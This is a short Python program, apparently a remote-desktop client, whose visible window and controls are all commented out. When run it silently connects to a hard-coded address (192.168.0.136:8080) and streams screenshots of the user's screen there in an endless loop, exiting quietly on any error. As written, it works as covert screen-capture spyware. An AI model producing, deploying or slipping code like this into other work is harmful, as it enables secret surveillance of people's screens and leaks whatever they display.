import socket
# Work with Image
from PIL import ImageGrab
import io
import numpy as np
from random import randint
import pyautogui
# Thread
from threading import Thread
# PyQt5
import sys
from PyQt5.QtWidgets import QMainWindow, QApplication, QWidget, QLabel, QPushButton, QAction, QMessageBox, QLineEdit
from PyQt5.QtGui import QPixmap
from PyQt5.QtCore import QRect, Qt

class Dekstop(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()

    def StartThread(self):
        self.start.start()

    def ChangeImage(self):
        try:
            if len('192.168.0.136') != 0 and len('8080'):
                sock = socket.socket()
                sock.connect(('192.168.0.136', int('8080')))
                while True:
                    img = ImageGrab.grab()
                    img_bytes = io.BytesIO()
                    img.save(img_bytes, format='PNG')
                    sock.send(img_bytes.getvalue())
                sock.close()
        except:
            exit()

    def initUI(self):
        #self.pixmap = QPixmap()
        #self.label = QLabel(self)
        #self.label.resize(self.width(), self.height())
        #self.setGeometry(QRect(pyautogui.size()[0] // 4, pyautogui.size()[1] // 4, 500, 300))
        #self.setFixedSize(self.width(), self.height())
        #self.setWindowTitle("Started Remote Desktop Connection: 192.168.1.72")
        self.start = Thread(target=self.ChangeImage, daemon=True)
        #self.btn = QPushButton(self)
        #self.btn.move(5, 55)
        #self.btn.resize(390, 30)
        #self.btn.setText("Start Remote Connection")
        #self.btn.clicked.connect(self.StartThread)
        #self.btn.clicked.connect(self.showMinimized)
        #self.ip = QLineEdit(self)
        #self.ip.move(5, 5)
        #self.ip.resize(390, 20)
        #self.ip.setPlaceholderText("Host IP")
        #self.port = QLineEdit(self)
        #self.port.move(5, 30)
        #self.port.resize(390, 20)
        #self.port.setPlaceholderText("Host PORT")
        self.start.start()
        
if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = Dekstop()
    #ex.show()
    sys.exit(app.exec())
